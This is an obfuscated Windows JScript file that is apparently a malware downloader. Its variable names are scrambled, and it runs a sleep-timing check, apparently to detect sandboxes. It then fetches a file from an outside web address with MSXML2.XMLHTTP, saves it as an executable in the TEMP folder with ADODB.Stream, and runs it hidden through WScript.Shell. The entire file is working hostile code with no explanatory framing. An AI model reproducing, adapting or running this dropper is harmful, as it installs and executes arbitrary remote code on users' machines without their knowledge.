var _XV = false;
var _C = "CreateObject";
var _EO = function _AW() {return WScript[_C]("WScript"+".Shell");}(), _F1 = 11;
var _MZ = "MSXML2.XMLHTTP";
var _N = 2123213;
var _E = 0;
function _B0(_OD){_EO["Run"](_OD, _E, _E);};
function _T(){return _MZ + "";};
function _W(_FL, _L){_E = _E * 1; return _FL - _L;};
function _IV(){return _C;};
/*@cc_on
  @if (@_win32 || @_win64)
    _XV = true;
  @end
@*/
if (_XV)
{
var _LC = "";
function _XL(){return 22;};
var _XM = 0; var _UT = 0;
function _KU()
{
var _S0 = new this["Date"]();
var _T0 = _S0["getUTCMilliseconds"]();
WScript["Sleep"](_XL());
var _S0 = new this["Date"]();
var _RC = _S0["getUTCMilliseconds"]();
WScript["Sleep"](_XL());
var _S0 = new this["Date"]();
var _H = _S0["getUTCMilliseconds"]();
var _XM = "_F0";
_XM = _W(_RC, _T0);
var _UT = "_Q";
_UT = _W(_H, _RC);
_LC = "open";
return _W(_XM, _UT);
}
var _J0 = false;
var _B1 = false;
for (var _R = _E; _R < _XL() * 1; _R++){if (_KU() != _E){
_J0 = true; 
_UT = "31" + 11 * _XM + _UT; 
_B1 = true; 
break;
}}
function _B() {return ((_J0 == true) && (_J0 == _B1)) ? 1 : _E;};
if (_J0 && _B() && _B1){
function _F() {return _EO["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "P5SAlPbG5C4Znr7f.ex" + "e";};
 _A = _T();
 _R0 = WScript[_C](_A);
 var _X = 1;
 while (_X){
try {
	if (_X == 1)
	{
		_R0[_LC]("GET", "http://srijanexportstowelwarmers.co.uk/k9owpa", false);
		_R0["send"]();
		_J = "Sleep";
	}
	WScript[_J](_XL() + 120); 
	if (_R0["readystate"] < 2 * 2) continue;
	_X = _E;
	function _GZ(_S) {var _HW = (1, 2, 3, 4, 5, _S); return _HW;};
	_BJ = WScript[_IV()]("ADODB.Stream");
	_A = _BJ;
	_A[_LC]();
	_A["type"] = _GZ(1);
	_A["write"](_R0["ResponseBody"]);
	_BJ["position"] = _GZ(_E);
	_A["Save" + "ToFile"](_F(), 2);
	_BJ["cl"+"ose"]();
	_Z = _F();
	_B0(_Z);
} catch(_EZ){};
}
}
}

